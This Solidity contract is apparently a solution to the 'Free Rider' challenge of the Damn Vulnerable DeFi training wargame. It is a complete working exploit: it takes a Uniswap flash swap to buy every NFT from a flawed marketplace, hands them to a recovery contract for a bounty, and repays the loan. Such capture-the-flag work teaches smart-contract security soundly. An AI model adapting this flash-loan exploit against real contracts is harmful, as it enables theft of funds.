// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "hardhat/console.sol";
import "../DamnValuableNFT.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

interface IUniswapV2Pair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IWETH {
    function transfer(address recipient, uint amount) external returns (bool);

    function deposit() external payable;

    function withdraw(uint amount) external;
}

contract FreeRiderAttack is IUniswapV2Callee {
    FreeRiderNFTMarketplace public marketplace;
    address public recovery;
    IUniswapV2Pair public pair;
    IWETH public weth;
    DamnValuableNFT public nft;
    uint256[] ids = [0, 1, 2, 3, 4, 5];
    address public owner;

    constructor(
        address _pair,
        address payable _marketplace,
        address _recovery,
        address _weth,
        address _nft
    ) {
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        recovery = _recovery;
        pair = IUniswapV2Pair(_pair);
        weth = IWETH(_weth);
        nft = DamnValuableNFT(_nft);
        owner = msg.sender;
    }

    function flashSwap(uint256 amount) external {
        // Need to pass some data to trigger uniswapV2Call (an empty string is OK)
        // amount0Out is WETH, amount1Out is DVT
        pair.swap(amount, 0, address(this), " ");
    }

    function uniswapV2Call(
        address /*sender*/,
        uint256 amount0,
        uint256 /*amount1*/,
        bytes calldata /*data*/
    ) external {
        // Get ETH for the WETH received
        weth.withdraw(amount0);

        // Buy all the NFTs with the ETH
        marketplace.buyMany{value: amount0}(ids);

        // Transfer the NFTs to the Recovery contract
        for (uint i = 0; i < ids.length; i++) {
            // We encode the address that'll receive the PRIZE of 45 ETH
            nft.safeTransferFrom(
                address(this),
                recovery,
                ids[i],
                abi.encode(owner)
            );
        }

        // Get WETH and return it WETH with a 0.03% fee
        uint256 fee = (amount0 * 3) / 997 + 1;
        weth.deposit{value: amount0 + fee}();
        weth.transfer(address(pair), amount0 + fee);

        // Now we could also transfer the 90 ETH earned from buying the NFTs to the owner...
    }

    function onERC721Received(
        address,
        address,
        uint256 /*_tokenId*/,
        bytes memory /*_data*/
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
